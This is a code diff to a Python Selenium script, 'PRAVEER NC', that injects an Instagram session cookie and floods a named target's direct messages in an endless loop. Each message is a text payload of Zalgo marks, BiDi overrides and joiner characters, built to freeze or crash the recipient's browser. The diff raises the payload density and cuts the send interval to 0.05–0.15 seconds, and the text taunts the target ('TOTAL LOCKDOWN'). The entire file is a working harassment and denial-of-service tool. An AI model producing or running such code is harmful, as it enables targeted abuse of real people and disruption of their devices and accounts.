@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (UNIVERSAL CPU-CRUSHER)
-# 📅 STATUS: GECKO-REFLOW + CHROMIUM-THRASHER | 10 AGENTS | 0.1s BURST
+# 🚀 PROJECT: PRAVEER NC (V100-EXTREME)
+# 📅 STATUS: ATOMIC RENDERING | DENSITY x12 | 10-AGENT WAVE
 
 import os, time, random, threading, sys, gc, tempfile
 from concurrent.futures import ThreadPoolExecutor
@@ -11,36 +11,37 @@ from selenium.webdriver.chrome.options import Options
 
 # --- MATRIX CONFIG ---
 THREADS = 2
-SESSION_LIMIT = 180 
+SESSION_LIMIT = 240 # Increased session life
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
-def get_universal_crusher_payload(target_name):
-    """The Universal Crusher: Optimized for Chrome and Firefox Freezes."""
-    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 SYSTEM FAILURE: {target_name.upper()} HAS BEEN OWNED\n"
+def get_extreme_impact_payload(target_name):
+    """The V100-Extreme: Layout Buffer Overflow & Grapheme Joining."""
+    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 TOTAL LOCKDOWN: {target_name.upper()}\n"
     
-    # 💥 THE 'GECKO-TRAP' (ZWNJ + Variation Selectors)
-    # Forces Firefox to restart text-shaping every 2 characters.
-    gecko_trap = "\u200C\ufe0f" * 150 
+    # 💥 THE 'GRAPHEME JOINER' (U+034F)
+    # Forces the layout engine to process the 10k block as one unbreakable unit.
+    joiner = "\u034F" * 15
     
-    # 💥 PLANE-1 OVERLAYS (Vector Glyphs)
-    # Triggers 'Complex Rendering Path' in all browsers.
-    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 8
+    # 💥 PLANE-1 FRAKTUR (Vector Complexity)
+    vector_chaos = "𝔓𝔄𝔙𝔈𝔈𝔔 𝔓𝔄𝔓𝔄 " * 5
     
-    # 💥 THE '8x DENSITY' ZALGO (100 marks per character)
-    z_tower = "̸" * 100
+    # 💥 DENSITY x12 (120 marks per character)
+    # This is the 'Yesterday Heavy' feel.
+    z_tower = "̸" * 120
     
-    # 💥 MEMORY BLOAT (6,500 invisible markers)
-    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060", "\uFEFF"]) for _ in range(6500))
+    # 💥 BiDi RECURSION (Deep Directional Stacking)
+    # Target: Firefox/Safari rendering queue.
+    bidi_stack = "\u202E\u2066\u202D\u2067\u202B\u2068" * 10
+
+    lines = [header, vector_chaos]
     
-    lines = [header, gecko_trap, vector_chaos, bloat]
-    
-    for i in range(65):
-        # BiDi Overloads to target the 'Directional Stack' in Firefox/Gecko
+    # 💥 70 Lines of Atomic Skyscraper
+    for i in range(70):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        # Adding ZWNJ (\u200C) at the end of each line to force reflow
-        lines.append(f"{prefix} 𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴 {z_tower} \u200C")
+        # We sandwich the target name between joiners and 120-mark Zalgo
+        lines.append(f"{prefix}{joiner}{target_name.upper()}_VOID{z_tower}{bidi_stack}")
     
-    return "\n".join(lines)[:9950]
+    return "\n".join(lines)[:9990]
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -57,7 +58,7 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
     while True:
         driver = None
         try:
-            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ UNIVERSAL CRUSHER DEPLOYED...", flush=True)
+            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ V100-EXTREME DEPLOYED...", flush=True)
             driver = get_driver(agent_id)
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
@@ -71,8 +72,8 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                     
-                    # 🔥 HIGH-IMPACT BURST: 0.1s - 0.3s
-                    payload = get_universal_crusher_payload(target_name)
+                    # 🔥 THE 'WAVE' SPEED: Continuous Main-Thread Pressure
+                    payload = get_extreme_impact_payload(target_name)
                     driver.execute_script("""
                         var el = arguments[0];
                         document.execCommand('insertText', false, arguments[1]);
@@ -81,8 +82,8 @@ def run_life_cycle(agent_id, cookie, target_id, target_name):
                     
                     box.send_keys(Keys.ENTER)
                     
-                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 IMPACT DELIVERED", flush=True)
-                    time.sleep(random.uniform(0.1, 0.3)) 
+                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 EXTREME IMPACT DELIVERED", flush=True)
+                    time.sleep(random.uniform(0.05, 0.15)) 
                     
                 except:
                     time.sleep(5)
